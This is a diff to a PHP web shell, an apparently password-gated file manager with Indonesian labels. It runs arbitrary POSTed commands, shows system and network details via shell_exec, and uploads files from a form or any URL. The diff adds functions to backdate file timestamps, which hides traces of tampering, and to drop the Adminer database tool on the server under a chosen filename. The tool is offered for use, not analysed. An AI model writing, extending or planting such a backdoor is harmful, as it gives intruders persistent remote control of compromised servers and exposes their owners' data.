@@ -80,6 +80,60 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
     exit;
 }
 
+// Fungsi untuk menampilkan informasi sistem
+function displaySystemInfo() {
+    $info = [
+        'System' => php_uname(),
+        'PHP Version' => phpversion(),
+        'Server IP' => $_SERVER['SERVER_ADDR'],
+        'Client IP' => $_SERVER['REMOTE_ADDR'],
+        'Document Root' => $_SERVER['DOCUMENT_ROOT'],
+        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
+    ];
+
+    foreach ($info as $key => $value) {
+        echo "<p><strong>$key:</strong> $value</p>";
+    }
+}
+
+// Fungsi untuk menampilkan informasi jaringan
+function displayNetworkInfo() {
+    $output = shell_exec('ifconfig');
+    echo "<pre>$output</pre>";
+}
+
+// Fungsi untuk mengubah tanggal modifikasi file
+function changeFileDate($path, $newDate) {
+    $timestamp = strtotime($newDate);
+    if (touch($path, $timestamp)) {
+        echo "<div class='alert alert-success'>Tanggal berhasil diubah.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
+    }
+}
+
+// Fungsi upload file dari URL
+function uploadFromUrl($url, $saveTo) {
+    $fileContent = file_get_contents($url);
+    if ($fileContent === FALSE) {
+        die('Gagal mengunduh file dari URL');
+    }
+    file_put_contents($saveTo, $fileContent);
+    playAudio();
+    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
+}
+
+// Fungsi upload file dari form
+function uploadFromForm($file, $saveTo) {
+    if (move_uploaded_file($file['tmp_name'], $saveTo)) {
+        playAudio();
+        echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengupload file.</div>";
+    }
+}
+
+// Fungsi untuk menampilkan direktori dan file
 function display_path_links($dir) {
     if (is_dir($dir)) {
         $folders = [];
@@ -101,10 +155,12 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($folderPath));
             $isRoot = $folderPath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
-            echo "<div class='list-group-item d-flex align-items-center' $style>";
-            echo "<span class='folder-item flex-grow-1'>$folder/</span>";
-            echo "<span class='folder-permissions text-center'>" . get_permissions($folderPath) . "</span>";
-            echo "<span class='folder-date text-center'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
+            echo "<a href='?dir=$encodedPath' class='btn btn-link'>$folder/</a>";
+            echo "<span class='ml-auto'> | </span>";
+            echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
+            echo "<span class='ml-auto'> | </span>";
+            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
             echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
@@ -173,10 +229,12 @@ function display_path_links($dir) {
             $encodedPath = urlencode(base64_encode($filePath));
             $isRoot = $filePath === '/';
             $style = $isRoot ? "style='color:red;'" : "";
-            echo "<div class='list-group-item d-flex align-items-center' $style>";
-            echo "<span class='folder-item flex-grow-1'>$file</span>";
-            echo "<span class='folder-permissions text-center'>" . get_permissions($filePath) . "</span>";
-            echo "<span class='folder-date text-center'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
+            echo "<div class='list-group-item d-flex justify-content-between align-items-center' $style>";
+            echo "<span>$file</span>";
+            echo "<span class='ml-auto'> | </span>";
+            echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
+            echo "<span class='ml-auto'> | </span>";
+            echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
             echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
             echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
             echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
@@ -367,6 +425,13 @@ function executeCommand($command, $dir) {
     return htmlspecialchars($output);
 }
 
+// Fungsi untuk meng-upload Adminer
+function uploadAdminer($filename, $dir) {
+    $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
+    $saveTo = rtrim($dir, '/') . '/' . $filename . '.php';
+    uploadFromUrl($url, $saveTo);
+}
+
 // Proses permintaan yang diterima
 if (isset($_POST['url']) && isset($_POST['dir'])) {
     $url = $_POST['url'];
@@ -410,6 +475,12 @@ if (isset($_POST['command']) && isset($_POST['dir'])) {
     $command = $_POST['command'];
     $dir = base64_decode(urldecode($_POST['dir']));
     $commandOutput = executeCommand($command, $dir);
+}
+
+if (isset($_POST['uploadAdminer']) && isset($_POST['adminerFilename']) && isset($_POST['dir'])) {
+    $filename = $_POST['adminerFilename'];
+    $dir = base64_decode(urldecode($_POST['dir']));
+    uploadAdminer($filename, $dir);
 }
 
 if (isset($_GET['download'])) {
@@ -503,23 +574,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         .form-container .btn:hover, .open-button:hover {
             opacity: 1;
         }
-
-        .list-group-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #ddd;
-            padding: 10px 0;
-        }
-
-        .folder-item {
-            flex: 2;
-        }
-
-        .folder-permissions, .folder-date {
-            flex: 1;
-            text-align: center;
-        }
         
         .info-sites, .network-info {
             display: none;
@@ -550,7 +604,19 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
             </form>
             <button class="btn btn-primary" onclick="toggleInfoSites()">Informasi Web</button>
             <button class="btn btn-secondary" onclick="toggleNetworkInfo()">Network Info</button>
-            <button class="btn btn-success" onclick="showForm('uploadAdminer')">Upload Adminer</button>
+            <button class="btn btn-info" onclick="showForm('adminer-upload')">Upload Adminer</button>
+        </div>
+
+        <!-- Form Upload Adminer -->
+        <div id="adminer-upload" class="form-popup">
+            <form method="post" class="form-container">
+                <h4>Upload Adminer</h4>
+                <label for="adminerFilename"><b>Nama File</b></label>
+                <input type="text" placeholder="Masukkan nama file" name="adminerFilename" required>
+                <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
+                <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
+                <button type="button" class="btn btn-secondary" onclick="hideForm('adminer-upload')">Batal</button>
+            </form>
         </div>
 
         <!-- Informasi Web -->
@@ -561,18 +627,6 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         <!-- Informasi Jaringan -->
         <div id="networkInfo" class="network-info">
             <?php displayNetworkInfo(); ?>
-        </div>
-
-        <!-- Upload Adminer -->
-        <div id="uploadAdminer" class="form-popup">
-            <form method="post" class="form-container">
-                <h4>Upload Adminer</h4>
-                <label for="adminerFile"><b>Nama File Adminer</b></label>
-                <input type="text" id="adminerFile" name="adminerFile" placeholder="adminer.php" required>
-                <input type="hidden" name="dir" value="<?php echo urlencode(base64_encode($dir)); ?>">
-                <button type="submit" name="uploadAdminer" class="btn btn-primary">Upload</button>
-                <button type="button" class="btn btn-secondary" onclick="hideForm('uploadAdminer')">Batal</button>
-            </form>
         </div>
 
         <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
